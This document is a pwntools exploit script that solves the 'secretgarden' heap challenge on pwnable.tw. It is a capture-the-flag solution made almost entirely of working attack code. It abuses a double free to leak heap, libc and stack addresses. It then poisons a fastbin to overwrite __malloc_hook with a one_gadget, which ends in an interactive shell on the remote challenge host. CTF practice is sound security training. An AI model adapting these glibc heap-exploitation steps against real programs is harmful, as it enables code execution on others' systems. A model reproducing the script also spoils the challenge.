#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('secretgarden_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x0000555555400c32
        b*malloc
        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10203
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10203)
else:
    p = process([exe.path])


def add( size, name, color):
    slna(b'Your choice : ', 1)
    slna(b'Length of the name :', size)
    sa(b'The name of flower :', name)
    sla(b'The color of the flower :', color)

def rm(idx):
    slna(b'Your choice : ', 3)
    slna(b'Which flower do you want to remove from the garden:', idx)

add(0x500, b'asasaushw', b'aswd')
add(0x28, b'pad stack', b'evil?')

add(0x28, b'ahee', b'rede')
add(0x28, b'ahee', b'red')
rm(1)
def trigger(name ,color):
    rm(2)
    rm(3)
    rm(2)
    # 0x555555602020
    add(0x50, b'a', b'v')
    add(0x28, name,color)
trigger(b'a'*8, b'a')

slna(b'Your choice : ', 2)
ru(b'aaaaaaaa')
heap_leak = u64(r(6) + b'\0\0')
heap_base = heap_leak -0x1680
info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')
rm(0)
target = heap_base+0x10b0

load = b'b'*8 + p64(target)

trigger(load, b'e')
slna(b'Your choice : ', 2)

ru(b'flower[4] :')
libc_leak = u64(r(6) + b'\0\0')
libc.address  = libc_leak-0x3c3b78
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

load = b'a'*8 + p64(libc.sym.environ)

trigger(load, b'h')
slna(b'Your choice : ', 2)
ru(b'Name of the flower[4] :')
stack_leak = u64(r(6) + b'\0\0')
info(f'stack leak: {hex(stack_leak)}')
# target = heap_base+0x1580

target = stack_leak -0x14c

load = b'a'*8 + p64(target)

rm(2)
rm(3)
rm(2)
slna(b'Your choice : ', 4)


add(0x68, b'0', b'v')
add(0x68, b'1', b'v')
add(0x68, b'2', b'v')

rm(0)
rm(1)
rm(0)
target = libc.sym.__malloc_hook - 0x1b - 8
add(0x68, p64(target), b'v')
add(0x68, b'3', b'v')
add(0x68, b'4', b'v')

one = libc.address + 0xef6c4
load  =flat(
    b'a'*3,
    one,
    # libc.sym.memalign,
    one,
    libc.sym.realloc+20
    # one
)

add(0x68, load, b'v')
GDB()

slna(b'Your choice : ', 1)



# add(0x28, p64(0xcafe), b'v')
# add(0x28, p64(target), b'v')
# add(0x50, p64(0xcafebabe), b'v')



# sa(b'The name of flower :', name)
# sla(b'The color of the flower :', color)
p.interactive()
